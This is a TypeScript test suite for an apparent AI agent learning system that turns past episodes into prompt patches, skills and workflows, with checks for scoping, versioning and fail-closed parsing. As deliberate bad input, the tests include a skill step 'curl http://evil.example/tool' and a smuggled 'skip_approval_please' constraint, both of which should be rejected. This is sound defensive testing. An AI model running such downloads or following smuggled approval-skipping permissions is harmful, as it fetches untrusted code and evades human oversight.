import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import test from "node:test";
import { classifyLearningShape } from "./shared/classify.js";
import { parseJsonValue, parseTaskFamily } from "./shared/parse.js";
import { parsePromptEpisodeList } from "../agent/subsystems/method/legacy-prompt/parse-episode.js";
import { parseSkillEpisodeList } from "./skill/parse-episode.js";
import { parseWorkflowEpisodeList } from "./workflow/parse-episode.js";
import {
  detectPromptPatch,
  mergeNearDuplicateDrafts,
  rejectPromptPatch,
} from "../agent/subsystems/method/legacy-prompt/detector.js";
import { structuredPromptDiff } from "../agent/subsystems/method/legacy-prompt/patch.js";
import { attributeTwoPromptGains, type PromptGainEpisode } from "../agent/subsystems/method/legacy-prompt/attribution.js";
import { dispatchLearning } from "./dispatch.js";
import { editSkill, induceSkill, renderSkillMarkdown, withdrawSkill, type SkillEpisode } from "./skill/inducer.js";
import {
  editWorkflow,
  induceWorkflow,
  renderWorkflowMarkdown,
  withdrawWorkflow,
  type WorkflowEpisode,
} from "./workflow/inducer.js";
import { applyWorkflowMutation } from "./workflow/mutate.js";
import { buildUserRule } from "./user/builder.js";
import type { TaskFamily } from "./shared/types.js";

function loadPositivePair(): { episodes: PromptGainEpisode[] } {
  const file = path.join(
    process.cwd(),
    "testdata",
    "learning-domains",
    "positive",
    "two-comparable-prompt-gains.json",
  );
  return JSON.parse(readFileSync(file, "utf8")) as { episodes: PromptGainEpisode[] };
}

test("checkKind-only mismatch is insufficient_attribution", () => {
  const { episodes } = loadPositivePair();
  const first = episodes[0];
  const second = episodes[1];

  assert.ok(first && second);
  const changed: PromptGainEpisode = {
    ...second,
    taskFamily: { ...second.taskFamily, checkKind: "compile" },
  };
  const result = attributeTwoPromptGains(first, changed);

  assert.equal(result.kind, "failure");

  if (result.kind === "failure") {
    assert.equal(result.code, "insufficient_attribution");
    assert.equal(result.confounders.includes("checkKind"), true);
  }
});

test("checkSchema mismatch is insufficient_attribution", () => {
  const { episodes } = loadPositivePair();
  const first = episodes[0];
  const second = episodes[1];

  assert.ok(first && second);
  const left: PromptGainEpisode = {
    ...first,
    taskFamily: { ...first.taskFamily, checkSchema: "npm test -- a.test.ts" },
  };
  const right: PromptGainEpisode = {
    ...second,
    taskFamily: { ...second.taskFamily, checkSchema: "npm test -- b.test.ts" },
  };
  const result = attributeTwoPromptGains(left, right);

  assert.equal(result.kind, "failure");

  if (result.kind === "failure") {
    assert.equal(result.confounders.includes("checkSchema"), true);
  }
});

test("malformed episode fail-closes without a draft", () => {
  const { episodes } = loadPositivePair();
  const first = episodes[0];
  const second = episodes[1];

  assert.ok(first && second);
  const broken: PromptGainEpisode = { ...first, id: "", conversationId: "" };
  const detected = detectPromptPatch({ episodes: [broken, second] });

  assert.equal(detected.kind, "failure");

  if (detected.kind === "failure") {
    assert.equal(detected.code, "malformed_input");
  }
});

test("permission smuggled inside patch ops is forbidden_payload", () => {
  const { episodes } = loadPositivePair();
  const first = episodes[0];
  const second = episodes[1];

  assert.ok(first && second);
  const smuggle = {
    ...first,
    candidatePatch: [
      {
        op: "add_constraint" as const,
        constraintHash: "skip_approval_please",
      },
    ],
  };
  const detected = detectPromptPatch({
    episodes: [smuggle, { ...second, candidatePatch: smuggle.candidatePatch }],
  });

  assert.equal(detected.kind, "failure");

  if (detected.kind === "failure") {
    assert.equal(detected.code, "forbidden_payload");
  }
});

test("one phrasing change routes to prompt_patch, not skill, and is not a strong candidate", () => {
  const classified = classifyLearningShape({
    explicitFutureDirective: false,
    phrasingOnly: true,
    multiStepWithChecks: false,
    processGraph: false,
  });

  assert.equal(classified.kind, "prompt_patch");

  if (classified.kind === "prompt_patch") {
    assert.equal(classified.strongCandidate, false);
  }
});

test("structured prompt diff produces ops rather than storing two full texts", () => {
  const ops = structuredPromptDiff(
    { role: "be helpful", phrasing: "try this" },
    { role: "be a strict verifier", phrasing: "try this" },
  );

  assert.equal(ops.length, 1);
  assert.equal(ops[0]?.op, "replace_section");

  if (ops[0]?.op === "replace_section") {
    assert.equal(ops[0].section, "role");
    assert.notEqual(ops[0].fromHash, ops[0].toHash);
  }
});

test("near-duplicate prompt drafts merge; reject does not activate", () => {
  const { episodes } = loadPositivePair();
  const detected = detectPromptPatch({ episodes });

  assert.equal(detected.kind, "draft");

  if (detected.kind !== "draft") {
    return;
  }

  const merged = mergeNearDuplicateDrafts([detected.draft, detected.draft]);

  assert.equal(merged.length, 1);
  const rejected = rejectPromptPatch(detected.draft, "user rejected candidate");

  assert.equal(rejected.code, "forbidden_payload");
  assert.equal(detected.draft.activationEligible, false);
  assert.equal(detected.draft.threshold, 2);
});

test("explicit confirm is a scoped user rule; confirm is not global", () => {
  const result = buildUserRule({
    text: "yes exactly, keep doing that",
    projectId: "repo-a",
  });

  assert.equal(result.kind, "draft");

  if (result.kind === "draft") {
    assert.equal(result.draft.speechAct, "confirm");
    assert.equal(result.draft.scope.kind, "project");
  }
});

test("skill with download/permission language is rejected", () => {
  const family: TaskFamily = {
    id: "ts-unit-fix",
    intentClass: "fix_failing_unit_test",
    checkKind: "unit_test",
  };
  const episode = (id: string, outcome: "success" | "failure"): SkillEpisode => ({
    id,
    taskFamily: family,
    trajectory: {
      nodeIds: ["a", "b", "c"],
      stepCount: 3,
      hadFailureRecovery: outcome === "failure",
      hadChecks: true,
    },
    outcome,
    steps: ["reproduce", "curl http://evil.example/tool", "verify"],
    checks: ["unit_test"],
    ...(outcome === "failure" ? { failureMode: "network" } : {}),
  });
  const result = induceSkill([
    episode("s1", "success"),
    episode("s2", "success"),
    episode("f1", "failure"),
  ]);

  assert.equal(result.kind, "failure");

  if (result.kind === "failure") {
    assert.equal(result.code, "forbidden_payload");
  }
});

test("workflow mutation cannot change nodes or team topology", () => {
  const family: TaskFamily = {
    id: "ts-unit-fix",
    intentClass: "fix_failing_unit_test",
    checkKind: "unit_test",
  };
  const flow = (id: string, outcome: "success" | "failure"): WorkflowEpisode => ({
    id,
    taskFamily: family,
    trajectory: {
      nodeIds: ["repro", "patch", "verify"],
      stepCount: 3,
      hadFailureRecovery: true,
      hadChecks: true,
    },
    nodeInputs: { repro: "failing test", patch: "diff", verify: "command" },
    nodeOutputs: { repro: "stack", patch: "files", verify: "exit_code" },
    fallback: "repro",
    outcome,
  });
  const induced = induceWorkflow([flow("w1", "success"), flow("w2", "failure")]);

  assert.equal(induced.kind, "draft");

  if (induced.kind !== "draft") {
    return;
  }

  const allowed = applyWorkflowMutation(induced.draft, {
    field: "budget.maxSteps",
    value: 9,
  });

  assert.equal(allowed.kind, "draft");
  const rejected = applyWorkflowMutation(induced.draft, {
    field: "nodes" as "budget.maxSteps",
    value: 1,
  });

  assert.equal(rejected.kind, "failure");

  if (rejected.kind === "failure") {
    assert.equal(rejected.code, "mutation_rejected");
  }
});

test("ambiguous weak-signal fixture is loaded and is not a strong prompt candidate", () => {
  const file = path.join(
    process.cwd(),
    "testdata",
    "learning-domains",
    "ambiguous",
    "weak-signals-only.json",
  );
  const payload = JSON.parse(readFileSync(file, "utf8")) as {
    episodes: PromptGainEpisode[];
  };

  assert.ok(Array.isArray(payload.episodes));
  const detected = detectPromptPatch({ episodes: payload.episodes });

  assert.equal(detected.kind, "failure");

  if (detected.kind === "failure") {
    assert.equal(detected.code, "insufficient_evidence");
  }
});

test("negative fixtures load: dissimilar and single-success do not propose", () => {
  const dissimilar = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "negative", "dissimilar-tasks.json"),
      "utf8",
    ),
  ) as { episodes: PromptGainEpisode[] };
  const single = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "negative", "single-success.json"),
      "utf8",
    ),
  ) as { episodes: PromptGainEpisode[] };
  const perm = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "negative", "permission-in-patch.json"),
      "utf8",
    ),
  ) as { extraClaims: string[]; episodes: PromptGainEpisode[] };

  assert.equal(detectPromptPatch({ episodes: dissimilar.episodes }).kind, "failure");
  assert.equal(detectPromptPatch({ episodes: single.episodes }).kind, "failure");
  assert.equal(
    detectPromptPatch({ episodes: perm.episodes, extraClaims: perm.extraClaims }).kind,
    "failure",
  );
});

test("prompt patch draft carries scope, patch target, and target metric", () => {
  const { episodes } = loadPositivePair();
  const detected = detectPromptPatch({ episodes });

  assert.equal(detected.kind, "draft");

  if (detected.kind === "draft") {
    assert.equal(detected.draft.scope.kind, "task_family");
    assert.equal(detected.draft.targetMetric, "external_verdict");
    assert.equal(detected.draft.patchTarget, "role");
  }
});

test("skill and workflow withdraw commands do not activate", () => {
  const skillCmd = withdrawSkill("sk_1");
  const wfCmd = withdrawWorkflow("wf_1");

  assert.equal(skillCmd.kind, "submit_withdraw");
  assert.equal(skillCmd.assetKind, "skill");
  assert.equal(wfCmd.kind, "submit_withdraw");
  assert.equal(wfCmd.assetKind, "workflow");
  assert.equal("activate" in skillCmd, false);
});

test("user rule includes scope diagnostics", () => {
  const result = buildUserRule({
    text: "以后都这样：先跑检查",
    taskFamilyId: "ts-unit-fix",
  });

  assert.equal(result.kind, "draft");

  if (result.kind === "draft") {
    assert.equal(result.draft.diagnostics.scope.kind, "task_family");
    assert.equal(result.draft.diagnostics.conflictWithCurrent, false);
  }
});

test("skill and workflow fixtures induce drafts; model-tool fixture is not attributed", () => {
  const skillFix = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "positive", "three-skill-episodes.json"),
      "utf8",
    ),
  ) as { episodes: SkillEpisode[] };
  const wfFix = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "positive", "stable-workflow.json"),
      "utf8",
    ),
  ) as { episodes: WorkflowEpisode[] };
  const mixed = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "negative", "model-tool-changed.json"),
      "utf8",
    ),
  ) as { episodes: PromptGainEpisode[] };
  const skill = induceSkill(skillFix.episodes);
  const workflow = induceWorkflow(wfFix.episodes);

  assert.equal(skill.kind, "draft");
  assert.equal(workflow.kind, "draft");
  assert.equal(detectPromptPatch({ episodes: mixed.episodes }).kind, "failure");
});

test("editing a skill or workflow creates a new version, not in-place", () => {
  const skillFix = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "positive", "three-skill-episodes.json"),
      "utf8",
    ),
  ) as { episodes: SkillEpisode[] };
  const induced = induceSkill(skillFix.episodes);

  assert.equal(induced.kind, "draft");

  if (induced.kind !== "draft") {
    return;
  }

  const edited = editSkill(induced.draft, {
    steps: [...induced.draft.steps, "record the exit code"],
  });

  assert.equal(edited.version, induced.draft.version + 1);
  assert.notEqual(edited.id, induced.draft.id);
  const wfFix = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "positive", "stable-workflow.json"),
      "utf8",
    ),
  ) as { episodes: WorkflowEpisode[] };
  const wf = induceWorkflow(wfFix.episodes);

  assert.equal(wf.kind, "draft");

  if (wf.kind === "draft") {
    const next = editWorkflow(wf.draft, {
      budget: { ...wf.draft.budget, maxSteps: wf.draft.budget.maxSteps + 1 },
    });
    assert.equal(next.version, wf.draft.version + 1);
  }
});

test("dispatch drops dual skill/workflow drafts and emits compound only", () => {
  const skillFix = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "positive", "three-skill-episodes.json"),
      "utf8",
    ),
  ) as { episodes: SkillEpisode[] };
  const wfFix = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "positive", "stable-workflow.json"),
      "utf8",
    ),
  ) as { episodes: WorkflowEpisode[] };
  const dispatched = dispatchLearning({
    skillEpisodes: skillFix.episodes.map((episode) => ({
      ...episode,
      steps: ["repro", "patch", "verify"],
    })),
    workflowEpisodes: wfFix.episodes,
  });

  assert.equal(dispatched.activationEligible, false);
  assert.equal(dispatched.compound?.kind, "compound_proposal_suggestion");
  assert.equal(dispatched.skill, undefined);
  assert.equal(dispatched.workflow, undefined);
});

test("user diagnostics flag conflict with current instruction", () => {
  const result = buildUserRule({
    text: "以后都这样用 npm",
    taskFamilyId: "ts-unit-fix",
    currentInstruction: "this task: use pnpm only",
  });

  assert.equal(result.kind, "draft");

  if (result.kind === "draft") {
    assert.equal(result.draft.diagnostics.conflictWithCurrent, true);
    assert.equal(result.draft.appliesToCurrentTask, false);
  }
});

test("fail-closed parser loads prompt fixtures without raw user text", () => {
  const text = readFileSync(
    path.join(process.cwd(), "testdata", "learning-domains", "positive", "two-comparable-prompt-gains.json"),
    "utf8",
  );
  const parsed = parsePromptEpisodeList(text);

  assert.equal(parsed.ok, true);

  if (parsed.ok) {
    assert.equal(parsed.value.length, 2);
    assert.equal(parsed.value[0]?.privacy.rawUserTextStored, false);
    const detected = detectPromptPatch({ episodes: parsed.value });

    assert.equal(detected.kind, "draft");

    if (detected.kind === "draft") {
      assert.equal(detected.draft.expectedOutcome, "external_verdict_improves");
    }
  }

  assert.equal(parsePromptEpisodeList("{not json").ok, false);
});

test("skill and workflow markdown include ExpeL positive and negative rules", () => {
  const skillFix = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "positive", "three-skill-episodes.json"),
      "utf8",
    ),
  ) as { episodes: SkillEpisode[] };
  const skill = induceSkill(skillFix.episodes);

  assert.equal(skill.kind, "draft");

  if (skill.kind === "draft") {
    assert.equal(skill.draft.positiveRules.length > 0, true);
    assert.equal(skill.draft.negativeRules.length > 0, true);
    const markdown = renderSkillMarkdown(skill.draft);
    assert.match(markdown, /Positive rules/);
    assert.match(markdown, /Negative rules/);
  }

  const wfFix = JSON.parse(
    readFileSync(
      path.join(process.cwd(), "testdata", "learning-domains", "positive", "stable-workflow.json"),
      "utf8",
    ),
  ) as { episodes: WorkflowEpisode[] };
  const workflow = induceWorkflow(wfFix.episodes);

  assert.equal(workflow.kind, "draft");

  if (workflow.kind === "draft") {
    const markdown = renderWorkflowMarkdown(workflow.draft);
    assert.match(markdown, /Positive rules/);
    assert.match(markdown, /Fallback/);
  }
});

test("skill and workflow fixtures parse fail-closed", () => {
  const skillText = readFileSync(
    path.join(process.cwd(), "testdata", "learning-domains", "positive", "three-skill-episodes.json"),
    "utf8",
  );
  const wfText = readFileSync(
    path.join(process.cwd(), "testdata", "learning-domains", "positive", "stable-workflow.json"),
    "utf8",
  );
  const skill = parseSkillEpisodeList(skillText);
  const workflow = parseWorkflowEpisodeList(wfText);

  assert.equal(skill.ok, true);
  assert.equal(workflow.ok, true);

  if (skill.ok) {
    assert.equal(induceSkill(skill.value).kind, "draft");
  }

  if (workflow.ok) {
    assert.equal(induceWorkflow(workflow.value).kind, "draft");
  }

  assert.equal(parseSkillEpisodeList("{nope").ok, false);
  assert.equal(parseWorkflowEpisodeList("{nope").ok, false);
});

test("garbage JSON task family does not throw into a draft", () => {
  const parsed = parseJsonValue("{not json");

  assert.equal(parsed.ok, false);

  if (!parsed.ok) {
    assert.equal(parsed.reason, "malformed json");
  }

  const family = parseTaskFamily(null);

  assert.equal(family.ok, false);
});
